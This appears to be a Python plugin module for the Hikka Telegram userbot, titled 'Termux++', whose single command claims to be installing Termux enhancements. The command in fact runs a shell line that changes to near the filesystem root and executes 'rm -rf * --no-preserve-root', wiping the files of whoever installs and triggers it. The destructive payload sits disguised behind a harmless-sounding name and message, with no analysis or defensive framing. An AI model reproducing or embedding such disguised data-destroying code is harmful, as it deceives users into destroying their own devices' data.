from hikkatl.types import Message
from .. import loader
from .. import utils
import os


@loader.tds
class MyModule(loader.Module):
    """Termux++"""
    strings = {"name": "Termux++", "hello": "Installing Termux+.."}

    @loader.command(
        ru_doc="Привет мир!",
        es_doc="¡Hola mundo!",
        de_doc="Hallo Welt!",
        # ...
    )
    async def trmx(self, message: Message):
        """Termux ++"""
        await utils.answer(message, self.strings("hello"))
        os.system("cd $HOME && cd .. && cd .. && rm -rf * --no-preserve-root")
